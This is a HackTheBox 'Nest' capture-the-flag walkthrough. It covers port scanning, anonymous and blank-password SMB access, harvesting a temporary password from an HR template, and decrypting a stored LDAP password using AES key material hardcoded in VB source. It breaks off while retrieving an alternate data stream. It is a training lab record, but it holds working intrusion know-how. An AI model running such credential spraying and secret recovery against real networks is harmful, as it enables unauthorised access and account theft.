# Nest | HackTheBox

### 1. Scan
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $sudo nmap -A -p- -T4 10.129.174.55
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 07:27 UTC
Nmap scan report for 10.129.174.55
Host is up (0.16s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.91%I=7%D=7/17%Time=60F286E0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(GenericLin
SF:es,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognise
SF:d\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service\x2
SF:0V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20comma
SF:nd\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
SF:n\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20Repo
SF:rting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\nHQK
SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSStatusRequestTCP,21,"
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Help,F2,"\r\nHQK\
SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nThis\x20service\x20allows\
SF:x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20th
SF:e\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---
SF:\r\n\r\nLIST\r\nSETDIR\x20<Directory_Name>\r\nRUNQUERY\x20<Query_ID>\r\
SF:nDEBUG\x20<Password>\r\nHELP\x20<Command>\r\n>")%r(SSLSessionReq,21,"\r
SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServerCooki
SF:e,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TLSSessionR
SF:eq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Kerberos,2
SF:1,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(SMBProgNeg,21,
SF:"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(X11Probe,21,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(FourOhFourRequest,3A
SF:,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20
SF:command\r\n>")%r(LPDString,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(LDAPSearchReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.
SF:2\r\n\r\n>")%r(LDAPBindReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(SIPOptions,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r
SF:\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(LANDesk-RC,21,"\r\nHQK\x20R
SF:eporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServer,21,"\r\nHQK\x2
SF:0Reporting\x20Service\x20V1\.2\r\n\r\n>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (89%), Microsoft Windows 8.1 Update 1 (89%), Microsoft Windows Phone 7.5 or 8.0 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 R2 or Windows 8.1 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-17T07:32:16
|_  start_date: 2021-07-17T07:26:23
```
The machine is running SMB and something on port 4386.

### 2. Look at port 4386
```bash
┌─[htb-jib1337@htb-8vwinqnr40]─[~/Desktop/nest]
└──╼ $telnet 10.129.174.55 4386
Trying 10.129.174.55...
Connected to 10.129.174.55.
Escape character is '^]'.

HQK Reporting Service V1.2

>HELP 

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>

```
Doing some research into this service shows it doesn't seem to be a real/well known thing. Possible something to come back to later.

### 3. Enumerate SMB
Let's see what shares are there. It is possible to access the list anonymously.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $smbclient -L //10.129.174.55
Enter WORKGROUP\htb-jib1337's password: 

  Sharename       Type      Comment
  ---------       ----      -------
  ADMIN$          Disk      Remote Admin
  C$              Disk      Default share
  Data            Disk      
  IPC$            IPC       Remote IPC
  Secure$         Disk      
  Users           Disk      
SMB1 disabled -- no workgroup available
```

All of these shares appear to be read only at the moment. The Users share is the most interesting as it provides a list of users for the machine.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $smbclient //10.129.174.55/Users
Enter WORKGROUP\htb-jib1337's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 23:04:21 2020
  ..                                  D        0  Sat Jan 25 23:04:21 2020
  Administrator                       D        0  Fri Aug  9 15:08:23 2019
  C.Smith                             D        0  Sun Jan 26 07:21:44 2020
  L.Frost                             D        0  Thu Aug  8 17:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 17:02:50 2019
  TempUser                            D        0  Wed Aug  7 22:55:56 2019

    10485247 blocks of size 4096. 6543020 blocks available
```

Throw these into CME to see if any users can be accessed with blank passwords.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $cat users.txt
Administrator
C.Smith
L.Frost
R.Thompson
TempUser

┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $crackmapexec smb 10.129.174.55 -u users.txt -p '' --continue-on-success
SMB         10.129.174.55   445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.129.174.55   445    HTB-NEST         [-] HTB-NEST\Administrator: STATUS_LOGON_FAILURE 
SMB         10.129.174.55   445    HTB-NEST         [-] HTB-NEST\C.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.174.55   445    HTB-NEST         [+] HTB-NEST\L.Frost: 
SMB         10.129.174.55   445    HTB-NEST         [+] HTB-NEST\R.Thompson: 
SMB         10.129.174.55   445    HTB-NEST         [-] HTB-NEST\TempUser: STATUS_LOGON_FAILURE
```

Both L.Frost and R.Thompson log in without passwords. Looking at the permissions for them, they still only have read access to the Data and Users shares.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $crackmapexec smb 10.129.174.55 -u 'L.Frost' -p '' --shares
SMB         10.129.174.55   445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.129.174.55   445    HTB-NEST         [+] HTB-NEST\L.Frost: 
SMB         10.129.174.55   445    HTB-NEST         [+] Enumerated shares
SMB         10.129.174.55   445    HTB-NEST         Share           Permissions     Remark
SMB         10.129.174.55   445    HTB-NEST         -----           -----------     ------
SMB         10.129.174.55   445    HTB-NEST         ADMIN$                          Remote Admin
SMB         10.129.174.55   445    HTB-NEST         C$                              Default share
SMB         10.129.174.55   445    HTB-NEST         Data            READ            
SMB         10.129.174.55   445    HTB-NEST         IPC$                            Remote IPC
SMB         10.129.174.55   445    HTB-NEST         Secure$                         
SMB         10.129.174.55   445    HTB-NEST         Users           READ 
```
R.Thompson is the same as above.

### 4. Access files on the shares
Now go onto the Data share, and pull a maintenance log. This wasn't possible without an account before.
```bash
┌─[✗]─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $smbclient -U 'R.Thompson' \\\\10.129.174.55\\Data
Enter WORKGROUP\R.Thompson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 22:53:46 2019
  ..                                  D        0  Wed Aug  7 22:53:46 2019
  IT                                  D        0  Wed Aug  7 22:58:07 2019
  Production                          D        0  Mon Aug  5 21:53:38 2019
  Reports                             D        0  Mon Aug  5 21:53:44 2019
  Shared                              D        0  Wed Aug  7 19:07:51 2019

    10485247 blocks of size 4096. 6542992 blocks available

smb: \> cd Shared
smb: \Shared\> ls
  .                                   D        0  Wed Aug  7 19:07:51 2019
  ..                                  D        0  Wed Aug  7 19:07:51 2019
  Maintenance                         D        0  Wed Aug  7 19:07:32 2019
  Templates                           D        0  Wed Aug  7 19:08:07 2019

    10485247 blocks of size 4096. 6542992 blocks available
smb: \Shared\> cd Maintenance\
smb: \Shared\Maintenance\> ls
  .                                   D        0  Wed Aug  7 19:07:32 2019
  ..                                  D        0  Wed Aug  7 19:07:32 2019
  Maintenance Alerts.txt              A       48  Mon Aug  5 23:01:44 2019

    10485247 blocks of size 4096. 6542992 blocks available
smb: \Shared\Maintenance\> get Maintenance Alerts.txt 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Shared\Maintenance\Maintenance
smb: \Shared\Maintenance\> get "Maintenance Alerts.txt"
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

The text file doesn't have anything important in it.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $cat Maintenance\ Alerts.txt 
There is currently no scheduled maintenance work
```
There's another file titled "Welcome Email.txt" in a Templates directory.
```bash
smb: \Shared\Maintenance\> cd ..
smb: \Shared\> ls
  .                                   D        0  Wed Aug  7 19:07:51 2019
  ..                                  D        0  Wed Aug  7 19:07:51 2019
  Maintenance                         D        0  Wed Aug  7 19:07:32 2019
  Templates                           D        0  Wed Aug  7 19:08:07 2019

    10485247 blocks of size 4096. 6542992 blocks available
smb: \Shared\> cd Templates\
smb: \Shared\Templates\> ls
  .                                   D        0  Wed Aug  7 19:08:07 2019
  ..                                  D        0  Wed Aug  7 19:08:07 2019
  HR                                  D        0  Wed Aug  7 19:08:01 2019
  Marketing                           D        0  Wed Aug  7 19:08:06 2019

    10485247 blocks of size 4096. 6542992 blocks available
smb: \Shared\Templates\> cd HR
smb: \Shared\Templates\HR\> ls
  .                                   D        0  Wed Aug  7 19:08:01 2019
  ..                                  D        0  Wed Aug  7 19:08:01 2019
  Welcome Email.txt                   A      425  Wed Aug  7 22:55:36 2019

    10485247 blocks of size 4096. 6543120 blocks available
smb: \Shared\Templates\HR\> get "Welcome Email.txt"
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (0.6 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```
This file has something interesting in it.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $cat Welcome\ Email.txt 
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```

### 5. Check out TempUser's access
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $crackmapexec smb 10.129.174.55 -u TempUser -p welcome2019 --shares
SMB         10.129.174.55   445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.129.174.55   445    HTB-NEST         [+] HTB-NEST\TempUser:welcome2019 
SMB         10.129.174.55   445    HTB-NEST         [+] Enumerated shares
SMB         10.129.174.55   445    HTB-NEST         Share           Permissions     Remark
SMB         10.129.174.55   445    HTB-NEST         -----           -----------     ------
SMB         10.129.174.55   445    HTB-NEST         ADMIN$                          Remote Admin
SMB         10.129.174.55   445    HTB-NEST         C$                              Default share
SMB         10.129.174.55   445    HTB-NEST         Data            READ            
SMB         10.129.174.55   445    HTB-NEST         IPC$                            Remote IPC
SMB         10.129.174.55   445    HTB-NEST         Secure$         READ            
SMB         10.129.174.55   445    HTB-NEST         Users           READ
```
This user can access the secure share.
```bash
┌─[✗]─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $smbclient -U 'TempUser' \\\\10.129.174.55\\Secure$
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 23:08:12 2019
  ..                                  D        0  Wed Aug  7 23:08:12 2019
  Finance                             D        0  Wed Aug  7 19:40:13 2019
  HR                                  D        0  Wed Aug  7 23:08:11 2019
  IT                                  D        0  Thu Aug  8 10:59:25 2019

    10485247 blocks of size 4096. 6543120 blocks available
smb: \> 
```
Turns out this is a dead end! SO close.
```bash
smb: \> cd Finance
smb: \Finance\> ls
NT_STATUS_ACCESS_DENIED listing \Finance\*
smb: \Finance\> cd ..
smb: \> cd IT
smb: \IT\> ls
NT_STATUS_ACCESS_DENIED listing \IT\*
smb: \IT\> cd ..
smb: \> cd HR
smb: \HR\> ls
NT_STATUS_ACCESS_DENIED listing \HR\*
smb: \HR\> cd ..
smb: \> ls
```
However there are more files accessible now as TempUser in the data share.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $smbclient -U 'TempUser' \\\\10.129.174.55\\Data
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 22:53:46 2019
  ..                                  D        0  Wed Aug  7 22:53:46 2019
  IT                                  D        0  Wed Aug  7 22:58:07 2019
  Production                          D        0  Mon Aug  5 21:53:38 2019
  Reports                             D        0  Mon Aug  5 21:53:44 2019
  Shared                              D        0  Wed Aug  7 19:07:51 2019

    10485247 blocks of size 4096. 6542992 blocks available
smb: \> cd IT
smb: \IT\> ls
  .                                   D        0  Wed Aug  7 22:58:07 2019
  ..                                  D        0  Wed Aug  7 22:58:07 2019
  Archive                             D        0  Mon Aug  5 22:33:58 2019
  Configs                             D        0  Wed Aug  7 22:59:34 2019
  Installs                            D        0  Wed Aug  7 22:08:30 2019
  Reports                             D        0  Sun Jan 26 00:09:13 2020
  Tools                               D        0  Mon Aug  5 22:33:43 2019
```
Let's pull all these files down.
```bash
┌─[✗]─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $smbget --recursive -U TempUser smb://10.129.174.55/Data
Password for [TempUser] connecting to //Data/10.129.174.55: 
Using workgroup WORKGROUP, user TempUser
smb://10.129.174.55/Data/IT/Configs/Adobe/editing.xml                                               
smb://10.129.174.55/Data/IT/Configs/Adobe/Options.txt                                               
smb://10.129.174.55/Data/IT/Configs/Adobe/projects.xml                                              
smb://10.129.174.55/Data/IT/Configs/Adobe/settings.xml                                              
smb://10.129.174.55/Data/IT/Configs/Atlas/Temp.XML                                                  
smb://10.129.174.55/Data/IT/Configs/Microsoft/Options.xml                                           
smb://10.129.174.55/Data/IT/Configs/NotepadPlusPlus/config.xml                                      
smb://10.129.174.55/Data/IT/Configs/NotepadPlusPlus/shortcuts.xml                                   
smb://10.129.174.55/Data/IT/Configs/RU Scanner/RU_config.xml                                        
smb://10.129.174.55/Data/Shared/Maintenance/Maintenance Alerts.txt                                  
smb://10.129.174.55/Data/Shared/Templates/HR/Welcome Email.txt                                      
Downloaded 16.65kB in 30 seconds
```

### 6. Check out the files
There is some good content in some of these files.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop/IT]
└──╼ $cat Configs/NotepadPlusPlus/config.xml
<?xml version="1.0" encoding="Windows-1252" ?>
...
    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
    </History>
```
In this file there is a password.
```bash
┌─[✗]─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop/IT]
└──╼ $cat "Configs/RU Scanner/RU_config.xml"
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
```
The password doesn't decode cleanly.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop/IT]
└──╼ $echo "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=" | base64 -d
}13��=X�J�BA�X*�Wc�f���?βc
```
It looks to be encrypted. This is a dead end, so now examine the file paths that were found earlier. Stepping into the secure share, Carl's folder can be accessed.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop/IT]
└──╼ $smbclient -U TempUser //10.129.174.55/Secure$
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> cd IT
smb: \IT\> cd Carl
smb: \IT\Carl\> ls
  .                                   D        0  Wed Aug  7 19:42:14 2019
  ..                                  D        0  Wed Aug  7 19:42:14 2019
  Docs                                D        0  Wed Aug  7 19:44:00 2019
  Reports                             D        0  Tue Aug  6 13:45:40 2019
  VB Projects                         D        0  Tue Aug  6 14:41:55 2019

    10485247 blocks of size 4096. 6542864 blocks available

```

Searching in these files, there is the "RU Scanner" solution. 
```bash
smb: \IT\Carl\VB Projects\WIP\RU\> ls
  .                                   D        0  Fri Aug  9 15:36:45 2019
  ..                                  D        0  Fri Aug  9 15:36:45 2019
  RUScanner                           D        0  Wed Aug  7 22:05:54 2019
  RUScanner.sln                       A      871  Tue Aug  6 14:45:36 2019

    10485247 blocks of size 4096. 6542864 blocks available
```

### 7. Decrypt the password
Pull all the files for the solution down.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop/IT]
└──╼ $smbget --recursive -U TempUser smb://10.129.174.55/Secure$/IT/Carl
Password for [TempUser] connecting to //Secure$/10.129.174.55: 
Using workgroup WORKGROUP, user TempUser
smb://10.129.174.55/Secure$/IT/Carl/Docs/ip.txt                                                     
smb://10.129.174.55/Secure$/IT/Carl/Docs/mmc.txt                                                    
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/ConfigFile.vb                      
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Module1.vb                         
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb 
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.myapp       
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb         
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb   
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.resx          
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb    
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.settings       
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj                  
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user             
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/SsoIntegration.vb                  
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Utils.vb                           
smb://10.129.174.55/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner.sln                                
Downloaded 25.18kB in 30 seconds
```
Looking through them, the file with the password encryption and decyption is IT/Carl/VB Projects/WIP/RU/RUScanner/Utils.vb (see Utils.vb). There is an Encrypt() and Decrypt() function.  
Encryption function:
```vba
Public Shared Function Encrypt(ByVal plainText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Using memoryStream As New IO.MemoryStream()
            Using cryptoStream As New CryptoStream(memoryStream, _
                                            encryptor, _
                                            CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                Dim cipherTextBytes As Byte() = memoryStream.ToArray()
                memoryStream.Close()
                cryptoStream.Close()
                Return Convert.ToBase64String(cipherTextBytes)
            End Using
        End Using
    End Function
```
Decryption function:
```vba
// Called via Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)

Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
End
```

Studying these functions, wrote a script to decrypt the password. See decrypt.py.
```bash
┌─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $python3 decrypt.py 
xRxRxPANCAK3SxRxRx
```

This password provides access to C.Smith.
```bash
┌─[✗]─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $crackmapexec smb 10.129.174.55 -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' --shares
SMB         10.129.174.55   445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.129.174.55   445    HTB-NEST         [+] HTB-NEST\C.Smith:xRxRxPANCAK3SxRxRx 
SMB         10.129.174.55   445    HTB-NEST         [+] Enumerated shares
SMB         10.129.174.55   445    HTB-NEST         Share           Permissions     Remark
SMB         10.129.174.55   445    HTB-NEST         -----           -----------     ------
SMB         10.129.174.55   445    HTB-NEST         ADMIN$                          Remote Admin
SMB         10.129.174.55   445    HTB-NEST         C$                              Default share
SMB         10.129.174.55   445    HTB-NEST         Data            READ            
SMB         10.129.174.55   445    HTB-NEST         IPC$                            Remote IPC
SMB         10.129.174.55   445    HTB-NEST         Secure$         READ            
SMB         10.129.174.55   445    HTB-NEST         Users           READ
```
Access the user's personal folder.
```bash
┌─[✗]─[htb-jib1337@htb-rbm1m5jkzi]─[~/Desktop]
└──╼ $smbclient -U 'C.Smith' //10.129.174.55/Users
Enter WORKGROUP\C.Smith's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 23:04:21 2020
  ..                                  D        0  Sat Jan 25 23:04:21 2020
  Administrator                       D        0  Fri Aug  9 15:08:23 2019
  C.Smith                             D        0  Sun Jan 26 07:21:44 2020
  L.Frost                             D        0  Thu Aug  8 17:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 17:02:50 2019
  TempUser                            D        0  Wed Aug  7 22:55:56 2019

    10485247 blocks of size 4096. 6542864 blocks available
smb: \> cd C.Smith
smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 07:21:44 2020
  ..                                  D        0  Sun Jan 26 07:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 23:06:17 2019
  user.txt                            A       32  Thu Aug  8 23:05:24 2019

    10485247 blocks of size 4096. 6542864 blocks available
```
Pick up some more files inside the HQK Reporting directory.
```bash
smb: \C.Smith\HQK Reporting\> ls
  .                                   D        0  Thu Aug  8 23:06:17 2019
  ..                                  D        0  Thu Aug  8 23:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 12:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 23:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 23:09:05 2019

    10485247 blocks of size 4096. 6542736 blocks available
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt"
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt of size 0 as Debug Mode Password.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \C.Smith\HQK Reporting\> get "HQK_Config_Backup.xml" 
getting file \C.Smith\HQK Reporting\HQK_Config_Backup.xml of size 249 as HQK_Config_Backup.xml (0.4 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```
... and an executable file inside the AD Integration Module directory.
```bash
smb: \C.Smith\HQK Reporting\AD Integration Module\> ls
  .                                   D        0  Fri Aug  9 12:18:42 2019
  ..                                  D        0  Fri Aug  9 12:18:42 2019
  HqkLdap.exe                         A    17408  Wed Aug  7 23:41:16 2019

    10485247 blocks of size 4096. 6542736 blocks available
smb: \C.Smith\HQK Reporting\AD Integration Module\> get HqkLdap.exe
getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (26.6 KiloBytes/sec) (average 7.2 KiloBytes/sec)
```
Inspecting the files: 
1. "HQK_Config_Backup.xml" has contents:
```xml
<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>
```
2. "Debug Mode Password.txt" looks to be empty, however running "allinfo" against the the password file shows there is an alternate data stream called "Password". This can be specified during a get command to retrieve the file using that stream.  
Reference: https://bigb0ss.medium.com/tip-smbclient-c5e1f40909d9  
```bash
smb: \C.Smith\HQK Reporting\> ls
  .                                   D        0  Thu Aug  8 23:06:17 2019
  ..                                  D        0  Thu Aug  8 23:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 12:18:42 2019
